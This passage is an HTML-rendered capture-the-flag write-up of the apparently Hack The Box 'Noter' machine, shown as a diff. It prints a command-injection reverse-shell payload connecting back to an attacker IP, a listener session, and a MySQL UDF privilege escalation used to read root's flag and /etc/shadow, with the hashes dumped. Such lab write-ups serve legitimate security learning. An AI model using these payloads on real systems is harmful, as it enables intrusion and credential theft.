+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ex">app.config[</span><span class="st">'MYSQL_USER'</span><span class="ex">]</span> = <span class="st">'DB_user'</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="ex">app.config[</span><span class="st">'MYSQL_PASSWORD'</span><span class="ex">]</span> = <span class="st">'DB_password'</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="ex">app.config[</span><span class="st">'MYSQL_DB'</span><span class="ex">]</span> = <span class="st">'app'</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Review the older backup, <strong><code>app_backup_1635803546</code></strong>, and we find.. .. <strong>MySQL Config - <code>app.py</code></strong></p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">app.config[</span><span class="st">'MYSQL_HOST'</span><span class="ex">]</span> = <span class="st">'localhost'</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="ex">app.config[</span><span class="st">'MYSQL_USER'</span><span class="ex">]</span> = <span class="st">'root'</span></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="ex">app.config[</span><span class="st">'MYSQL_PASSWORD'</span><span class="ex">]</span> = <span class="st">'Nildogg36'</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="ex">app.config[</span><span class="st">'MYSQL_DB'</span><span class="ex">]</span> = <span class="st">'app'</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Looking on the import and export functions we find and dangerous subprocess with <code>shell=True</code>, we can most likely exploit this function to get a reverse shell.</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Export remote</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="ex">@app.route</span><span class="er">(</span><span class="st">'/export_note_remote'</span><span class="ex">,</span> methods=<span class="pp">[</span><span class="st">'POST'</span><span class="pp">]</span><span class="kw">)</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="ex">@is_logged_in</span></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="ex">def</span> export_note_remote<span class="er">(</span><span class="kw">)</span><span class="bu">:</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="ex">check_VIP</span><span class="er">(</span><span class="va">session</span><span class="op">[</span><span class="st">'username'</span><span class="op">]</span><span class="kw">)</span><span class="bu">:</span></span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a>        <span class="ex">try:</span></span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>            <span class="ex">url</span> = request.form<span class="pp">[</span><span class="st">'url'</span><span class="pp">]</span></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a>            <span class="ex">status,</span> error = parse_url<span class="er">(</span><span class="ex">url</span><span class="kw">)</span></span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="kw">(</span><span class="ex">status</span> is True<span class="kw">)</span> <span class="ex">and</span> <span class="er">(</span><span class="ex">error</span> is None<span class="kw">)</span><span class="bu">:</span></span>
+<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a>                <span class="ex">try:</span></span>
+<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a>                    <span class="ex">r</span> = pyrequest.get<span class="er">(</span><span class="ex">url,allow_redirects=True</span><span class="kw">)</span></span>
+<span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a>                    <span class="ex">rand_int</span> = random.randint<span class="er">(</span><span class="ex">1,10000</span><span class="kw">)</span></span>
+<span id="cb10-15"><a href="#cb10-15" aria-hidden="true" tabindex="-1"></a>                    <span class="bu">command</span> = f<span class="st">"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"</span></span>
+<span id="cb10-16"><a href="#cb10-16" aria-hidden="true" tabindex="-1"></a>                    <span class="ex">subprocess.run</span><span class="er">(</span><span class="bu">command</span>, shell=True, executable=<span class="st">"/bin/bash"</span><span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Create a python3 revshell in a markdown file, and break the command synax as seen above, to execute our malicious revshell.</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  noter cat rev.md </span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="st">';python3 -c '</span><span class="ex">import</span> socket,subprocess,os<span class="kw">;</span><span class="va">s</span><span class="op">=</span>socket.socket<span class="kw">(</span><span class="ex">socket.AF_INET,socket.SOCK_STREAM</span><span class="kw">);</span><span class="ex">s.connect</span><span class="er">((</span><span class="st">"10.10.14.26"</span><span class="kw">,</span><span class="dv">4488</span><span class="kw">));</span><span class="ex">os.dup2</span><span class="er">(</span><span class="fu">s.fileno()</span><span class="ex">,0</span><span class="kw">);</span> <span class="ex">os.dup2</span><span class="er">(</span><span class="fu">s.fileno()</span><span class="ex">,1</span><span class="kw">);</span><span class="ex">os.dup2</span><span class="er">(</span><span class="fu">s.fileno()</span><span class="ex">,2</span><span class="kw">);</span><span class="ex">import</span> pty<span class="kw">;</span> <span class="ex">pty.spawn</span><span class="er">(</span><span class="st">"bash"</span><span class="kw">)</span><span class="st">' # '</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Export the file and grab the shell.</p>
+<p><img src="images/noter06.png" class="img-fluid"></p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  noter python3 <span class="at">-m</span> http.server 80  </span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Serving</span> HTTP on 0.0.0.0 port 80 <span class="er">(</span><span class="ex">http://0.0.0.0:80/</span><span class="kw">)</span> <span class="ex">...</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.11.160</span> <span class="at">-</span> <span class="at">-</span> [23/May/2022 10:39:35] <span class="st">"GET /rev.md HTTP/1.1"</span> 200 <span class="at">-</span></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  noter nc <span class="at">-lvnp</span> 4488            </span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a><span class="ex">listening</span> on <span class="pp">[</span><span class="ss">any</span><span class="pp">]</span> 4488 ...</span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a><span class="ex">connect</span> to <span class="pp">[</span><span class="ss">10.10.14.26</span><span class="pp">]</span> from <span class="er">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[10.10.11.160]</span> 50188</span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="ex">/bin/sh:</span> 0: can<span class="st">'t access tty; job control turned off</span></span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a><span class="st">$ id &amp;&amp; hostname</span></span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a><span class="st">uid=1001(svc) gid=1001(svc) groups=1001(svc)</span></span>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a><span class="st">noter</span></span>
+<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a><span class="st">$ cat user.txt  </span></span>
+<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a><span class="st">39482bdad8ae80f8eb950cab59f5ffc2</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<hr>
+</section>
+</section>
+<section id="root" class="level1">
+<h1>ROOT</h1>
+<section id="step-1-1" class="level3">
+<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
+<p>My first finding was the backup script <code>backup.sh</code>, and within we see the astirix being used. Here I spent some time looking if it was possible to exploit using <em>shell globbing</em> but to no avail.</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">svc@noter:/$</span> ls <span class="at">-al</span> /opt</span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="ex">total</span> 12</span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span>  2 root root 4096 May  2 23:05 .</span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 19 root root 4096 May  2 23:05 ..</span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="ex">-rwxr--r--</span>  1 root root  137 Dec 30 09:41 backup.sh</span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a><span class="ex">svc@noter:/$</span> cd opt</span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a><span class="ex">svc@noter:/opt$</span> cat backup.sh</span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
+<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a><span class="fu">zip</span> <span class="at">-r</span> <span class="kw">`</span><span class="bu">echo</span> /home/svc/ftp/admin/app_backup_<span class="va">$(</span><span class="fu">date</span> +%s<span class="va">)</span>.zip<span class="kw">`</span> /home/svc/app/web/<span class="pp">*</span> <span class="at">-x</span> /home/svc/app/web/misc/node_modules/<span class="pp">**</span><span class="dt">\*</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Instead I moved on to the MySQL database, to which we found root credentials in one of the backup files. (<code>root:Nildogg36</code>)</p>
+<p>Download the privesc https://www.exploit-db.com/exploits/1518 and write it to file, <code>raptor_udf2.c</code>. We meet all the criterias as we can login to MySQL as root. Create a user defined function for code execution and grab sensitive files and/or setup a reverse shell.</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">svc@noter:/dev/shm$</span> wget http://10.10.14.26/raptor_udf2.c</span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ex">svc@noter:/dev/shm$</span> gcc <span class="at">-g</span> <span class="at">-c</span> raptor_udf2.c</span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="ex">svc@noter:/dev/shm$</span> gcc <span class="at">-g</span> <span class="at">-shared</span> <span class="at">-Wl,-soname,raptor_udf2.so</span> <span class="at">-o</span> raptor_udf2.so raptor_udf2.o <span class="at">-lc</span></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="ex">svc@noter:/dev/shm$</span> ls <span class="at">-al</span></span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxrwt</span>  3 root root   120 May 23 11:39 .</span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 20 root root  4040 May 23 10:46 ..</span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a><span class="ex">drwx------</span>  4 root root    80 May 23 10:46 multipath</span>
+<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span>  1 svc  svc   4920 May 23 11:39 raptor_udf2.c</span>
+<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span>  1 svc  svc   7432 May 23 11:39 raptor_udf2.o</span>
+<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a><span class="ex">-rwxr-xr-x</span>  1 svc  svc  19360 May 23 11:39 raptor_udf2.so</span>
+<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a><span class="ex">svc@noter:~/app/web$</span> mysql <span class="at">--user</span><span class="op">=</span>root <span class="at">-p</span> <span class="at">--host</span> localhost</span>
+<span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a><span class="ex">Enter</span> password: Nildogg36</span>
+<span id="cb14-14"><a href="#cb14-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-15"><a href="#cb14-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-16"><a href="#cb14-16" aria-hidden="true" tabindex="-1"></a><span class="ex">MariaDB</span> [<span class="er">(</span><span class="ex">none</span><span class="kw">)</span><span class="ex">]</span><span class="op">&gt;</span> use mysql<span class="kw">;</span></span>
+<span id="cb14-17"><a href="#cb14-17" aria-hidden="true" tabindex="-1"></a><span class="ex">MariaDB</span> <span class="pp">[</span><span class="ss">mysql</span><span class="pp">]</span><span class="op">&gt;</span> show variables like <span class="st">'%plugin%'</span><span class="kw">;</span></span>
+<span id="cb14-18"><a href="#cb14-18" aria-hidden="true" tabindex="-1"></a><span class="ex">show</span> variables like <span class="st">'%plugin%'</span><span class="kw">;</span></span>
+<span id="cb14-19"><a href="#cb14-19" aria-hidden="true" tabindex="-1"></a><span class="ex">+-----------------+---------------------------------------------+</span></span>
+<span id="cb14-20"><a href="#cb14-20" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">Variable_name</span>   <span class="kw">|</span> <span class="ex">Value</span>                                       <span class="kw">|</span></span>
+<span id="cb14-21"><a href="#cb14-21" aria-hidden="true" tabindex="-1"></a><span class="ex">+-----------------+---------------------------------------------+</span></span>
+<span id="cb14-22"><a href="#cb14-22" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">plugin_dir</span>      <span class="kw">|</span> <span class="ex">/usr/lib/x86_64-linux-gnu/mariadb19/plugin/</span> <span class="kw">|</span></span>
+<span id="cb14-23"><a href="#cb14-23" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">plugin_maturity</span> <span class="kw">|</span> <span class="ex">gamma</span>                                       <span class="kw">|</span></span>
+<span id="cb14-24"><a href="#cb14-24" aria-hidden="true" tabindex="-1"></a><span class="ex">+-----------------+---------------------------------------------+</span></span>
+<span id="cb14-25"><a href="#cb14-25" aria-hidden="true" tabindex="-1"></a><span class="ex">2</span> rows in set <span class="er">(</span><span class="ex">0.001</span> sec<span class="kw">)</span></span>
+<span id="cb14-26"><a href="#cb14-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-27"><a href="#cb14-27" aria-hidden="true" tabindex="-1"></a><span class="ex">MariaDB</span> <span class="pp">[</span><span class="ss">mysql</span><span class="pp">]</span><span class="op">&gt;</span> create table foo<span class="er">(</span><span class="ex">line</span> blob<span class="kw">);</span></span>
+<span id="cb14-28"><a href="#cb14-28" aria-hidden="true" tabindex="-1"></a><span class="ex">create</span> table foo<span class="er">(</span><span class="ex">line</span> blob<span class="kw">);</span></span>
+<span id="cb14-29"><a href="#cb14-29" aria-hidden="true" tabindex="-1"></a><span class="ex">Query</span> OK, 0 rows affected <span class="er">(</span><span class="ex">0.006</span> sec<span class="kw">)</span></span>
+<span id="cb14-30"><a href="#cb14-30" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-31"><a href="#cb14-31" aria-hidden="true" tabindex="-1"></a><span class="ex">MariaDB</span> <span class="pp">[</span><span class="ss">mysql</span><span class="pp">]</span><span class="op">&gt;</span> insert into foo values<span class="er">(</span><span class="ex">load_file</span><span class="er">(</span><span class="st">'/dev/shm/raptor_udf2.so'</span><span class="kw">));</span></span>
+<span id="cb14-32"><a href="#cb14-32" aria-hidden="true" tabindex="-1"></a><span class="ex">insert</span> into foo values<span class="er">(</span><span class="ex">load_file</span><span class="er">(</span><span class="st">'/dev/shm/raptor_udf2.so'</span><span class="kw">));</span></span>
+<span id="cb14-33"><a href="#cb14-33" aria-hidden="true" tabindex="-1"></a><span class="ex">Query</span> OK, 1 row affected <span class="er">(</span><span class="ex">0.003</span> sec<span class="kw">)</span></span>
+<span id="cb14-34"><a href="#cb14-34" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-35"><a href="#cb14-35" aria-hidden="true" tabindex="-1"></a><span class="ex">MariaDB</span> <span class="pp">[</span><span class="ss">mysql</span><span class="pp">]</span><span class="op">&gt;</span> select <span class="pp">*</span> from foo into dumpfile <span class="st">'/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so'</span><span class="kw">;</span></span>
+<span id="cb14-36"><a href="#cb14-36" aria-hidden="true" tabindex="-1"></a><span class="ex">adb19/plugin/raptor_udf2.so</span><span class="st">';le '</span><span class="ex">/usr/lib/x86_64-linux-gnu/mari</span> </span>
+<span id="cb14-37"><a href="#cb14-37" aria-hidden="true" tabindex="-1"></a><span class="ex">Query</span> OK, 1 row affected <span class="er">(</span><span class="ex">0.001</span> sec<span class="kw">)</span></span>
+<span id="cb14-38"><a href="#cb14-38" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-39"><a href="#cb14-39" aria-hidden="true" tabindex="-1"></a><span class="ex">MariaDB</span> <span class="pp">[</span><span class="ss">mysql</span><span class="pp">]</span><span class="op">&gt;</span> create function do_system returns integer soname <span class="st">'raptor_udf2.so'</span><span class="kw">;</span></span>
+<span id="cb14-40"><a href="#cb14-40" aria-hidden="true" tabindex="-1"></a><span class="ex">o</span><span class="st">';ate function do_system returns integer soname '</span><span class="ex">raptor_udf2.s</span> </span>
+<span id="cb14-41"><a href="#cb14-41" aria-hidden="true" tabindex="-1"></a><span class="ex">Query</span> OK, 0 rows affected <span class="er">(</span><span class="ex">0.001</span> sec<span class="kw">)</span></span>
+<span id="cb14-42"><a href="#cb14-42" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-43"><a href="#cb14-43" aria-hidden="true" tabindex="-1"></a><span class="ex">MariaDB</span> <span class="pp">[</span><span class="ss">mysql</span><span class="pp">]</span><span class="op">&gt;</span> select <span class="pp">*</span> from mysql.func<span class="kw">;</span></span>
+<span id="cb14-44"><a href="#cb14-44" aria-hidden="true" tabindex="-1"></a><span class="cf">select</span> <span class="ex">*</span> from mysql.func<span class="kw">;</span></span>
+<span id="cb14-45"><a href="#cb14-45" aria-hidden="true" tabindex="-1"></a><span class="ex">+-----------+-----+----------------+----------+</span></span>
+<span id="cb14-46"><a href="#cb14-46" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">name</span>      <span class="kw">|</span> <span class="ex">ret</span> <span class="kw">|</span> <span class="ex">dl</span>             <span class="kw">|</span> <span class="bu">type</span>     <span class="kw">|</span></span>
+<span id="cb14-47"><a href="#cb14-47" aria-hidden="true" tabindex="-1"></a><span class="ex">+-----------+-----+----------------+----------+</span></span>
+<span id="cb14-48"><a href="#cb14-48" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">do_system</span> <span class="kw">|</span>   <span class="ex">2</span> <span class="kw">|</span> <span class="ex">raptor_udf2.so</span> <span class="kw">|</span> <span class="kw">function</span> <span class="kw">|</span></span>
+<span id="cb14-49"><a href="#cb14-49" aria-hidden="true" tabindex="-1"></a><span class="ex">+-----------+-----+----------------+----------+</span></span>
+<span id="cb14-50"><a href="#cb14-50" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-51"><a href="#cb14-51" aria-hidden="true" tabindex="-1"></a><span class="ex">MariaDB</span> <span class="pp">[</span><span class="ss">mysql</span><span class="pp">]</span><span class="op">&gt;</span> select do_system<span class="er">(</span><span class="st">'cat /root/root.txt &gt; /dev/shm/flag.txt; chown svc:svc /dev/shm/flag.txt'</span><span class="kw">);</span></span>
+<span id="cb14-52"><a href="#cb14-52" aria-hidden="true" tabindex="-1"></a> <span class="ex">svc:svc</span> /dev/shm/flag.txt<span class="st">');oot.txt &gt; /dev/shm/flag.txt; chown </span></span>
+<span id="cb14-53"><a href="#cb14-53" aria-hidden="true" tabindex="-1"></a><span class="st">+--------------------------------------------------------------------------------------+</span></span>
+<span id="cb14-54"><a href="#cb14-54" aria-hidden="true" tabindex="-1"></a><span class="st">| do_system('</span>cat /root/root.txt <span class="op">&gt;</span> /dev/shm/flag.txt<span class="kw">;</span> <span class="fu">chown</span> svc:svc /dev/shm/flag.txt<span class="st">') |</span></span>
+<span id="cb14-55"><a href="#cb14-55" aria-hidden="true" tabindex="-1"></a><span class="st">+--------------------------------------------------------------------------------------+</span></span>
+<span id="cb14-56"><a href="#cb14-56" aria-hidden="true" tabindex="-1"></a><span class="st">|                                                                                    0 |</span></span>
+<span id="cb14-57"><a href="#cb14-57" aria-hidden="true" tabindex="-1"></a><span class="st">+--------------------------------------------------------------------------------------+</span></span>
+<span id="cb14-58"><a href="#cb14-58" aria-hidden="true" tabindex="-1"></a><span class="st">1 row in set (0.003 sec)</span></span>
+<span id="cb14-59"><a href="#cb14-59" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-60"><a href="#cb14-60" aria-hidden="true" tabindex="-1"></a><span class="st">MariaDB [mysql]&gt; select do_system('</span>cat /etc/shadow <span class="op">&gt;</span> /dev/shm/shadow<span class="kw">;</span> <span class="fu">chown</span> svc:svc /dev/shm/shadow<span class="st">');</span></span>
+<span id="cb14-61"><a href="#cb14-61" aria-hidden="true" tabindex="-1"></a><span class="st">svc /dev/shm/shadow'</span><span class="er">)</span><span class="kw">;</span><span class="ex">/etc/shadow</span> <span class="op">&gt;</span> /dev/shm/shadow<span class="kw">;</span> <span class="fu">chown</span> svc: </span>
+<span id="cb14-62"><a href="#cb14-62" aria-hidden="true" tabindex="-1"></a><span class="ex">+-------------------------------------------------------------------------------+</span></span>
+<span id="cb14-63"><a href="#cb14-63" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">do_system</span><span class="er">(</span><span class="st">'cat /etc/shadow &gt; /dev/shm/shadow; chown svc:svc /dev/shm/shadow'</span><span class="kw">)</span> <span class="kw">|</span></span>
+<span id="cb14-64"><a href="#cb14-64" aria-hidden="true" tabindex="-1"></a><span class="ex">+-------------------------------------------------------------------------------+</span></span>
+<span id="cb14-65"><a href="#cb14-65" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>                                                                             <span class="ex">0</span> <span class="kw">|</span></span>
+<span id="cb14-66"><a href="#cb14-66" aria-hidden="true" tabindex="-1"></a><span class="ex">+-------------------------------------------------------------------------------+</span></span>
+<span id="cb14-67"><a href="#cb14-67" aria-hidden="true" tabindex="-1"></a><span class="ex">1</span> row in set <span class="er">(</span><span class="ex">0.004</span> sec<span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Reap the rewards and prosper.</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">svc@noter:/dev/shm$</span> ls <span class="at">-al</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-al</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="ex">total</span> 44</span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxrwt</span>  3 root root   200 May 23 13:05 .</span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 20 root root  4040 May 23 12:51 ..</span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-rw----</span>  1 svc  svc     33 May 23 13:02 flag.txt</span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-rw----</span>  1 svc  svc    152 May 23 13:01 ls</span>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a><span class="ex">drwx------</span>  4 root root    80 May 23 12:51 multipath</span>
+<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span>  1 svc  svc   3300 May 23 12:51 raptor_udf2.c</span>
+<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span>  1 svc  svc   7432 May 23 12:54 raptor_udf2.o</span>
+<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a><span class="ex">-rwxr-xr-x</span>  1 svc  svc  19360 May 23 12:54 raptor_udf2.so</span>
+<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-rw----</span>  1 svc  svc   1474 May 23 13:05 shadow</span>
+<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-14"><a href="#cb15-14" aria-hidden="true" tabindex="-1"></a><span class="ex">svc@noter:/dev/shm$</span> cat ls</span>
+<span id="cb15-15"><a href="#cb15-15" aria-hidden="true" tabindex="-1"></a><span class="ex">total</span> 8</span>
+<span id="cb15-16"><a href="#cb15-16" aria-hidden="true" tabindex="-1"></a><span class="ex">drwx------</span> 2 root root 4096 May  2 23:05 .</span>
+<span id="cb15-17"><a href="#cb15-17" aria-hidden="true" tabindex="-1"></a><span class="ex">drwx------</span> 9 root root 4096 May  2 23:05 ..</span>
+<span id="cb15-18"><a href="#cb15-18" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-------</span> 1 root root    0 Dec 21 20:38 authorized_keys</span>
+<span id="cb15-19"><a href="#cb15-19" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-20"><a href="#cb15-20" aria-hidden="true" tabindex="-1"></a><span class="ex">svc@noter:/dev/shm$</span> cat flag.txt</span>
+<span id="cb15-21"><a href="#cb15-21" aria-hidden="true" tabindex="-1"></a><span class="ex">6c96f935fcd96c108b9abaa111e3c613</span></span>
+<span id="cb15-22"><a href="#cb15-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-23"><a href="#cb15-23" aria-hidden="true" tabindex="-1"></a><span class="ex">svc@noter:/dev/shm$</span> cat shadow</span>
+<span id="cb15-24"><a href="#cb15-24" aria-hidden="true" tabindex="-1"></a><span class="ex">root:</span><span class="va">$6$0</span><span class="ex">9RSjU3jIh/2JW1u</span><span class="va">$8</span><span class="ex">jlcYzW5Oyzgh/TrlTPX5Wq2HMTA6zUooij/9j0.NIttTYp4x0h6wmq8chrcdtvNpZzHlHzwsI8GesOKI3NYn.:18991:0:99999:7:::</span></span>
+<span id="cb15-25"><a href="#cb15-25" aria-hidden="true" tabindex="-1"></a><span class="ex">svc:</span><span class="va">$6$gTM</span><span class="ex">.AIsgDue4r5AQ</span><span class="va">$wUBfUtg7</span><span class="ex">/svAcRTnsFv51KuMpeNP0cL6vqIR3608pzd0YsNNe0oxMwvY7iAGMCgMp7viiBLUwUaAZx4r6ljME/:18988:0:99999:7:::</span></span>
+<span id="cb15-26"><a href="#cb15-26" aria-hidden="true" tabindex="-1"></a><span class="ex">ftp_admin:</span><span class="va">$6$gQyFQc6w7p83bBwZ$6</span><span class="ex">zYRlPKPBp6GMgUI5mbojxOvyup7hqrQ5hfscnLkwvIimC6qO5a0taiju1vYQPSnzf.mO5TgCdo.5RiO9Gu7J0:19114:0:99999:7:::</span></span>
+<span id="cb15-27"><a href="#cb15-27" aria-hidden="true" tabindex="-1"></a><span class="ex">blue:</span><span class="va">$6$pNud9u</span><span class="ex">/1PdD8qPYi</span><span class="va">$cSe5FPCRGH5xjUiEMJ5tXSclSrWSz7gimtR2IcXiiVk0xNfSACcVgU3C4z69RnZHEQKrNO</span><span class="ex">/hIiUQdVTqlxb29.:19114:0:99999:7:::</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<hr>
+</section>
+</section>
+<section id="references" class="level1">
+<h1>References</h1>
+<p><strong>Privesc, MySQL User Defined Functions</strong> https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf https://www.exploit-db.com/exploits/1518</p>
+
+
+</section>
+
+</main> <!-- /main -->
+<script id="quarto-html-after-body" type="application/javascript">
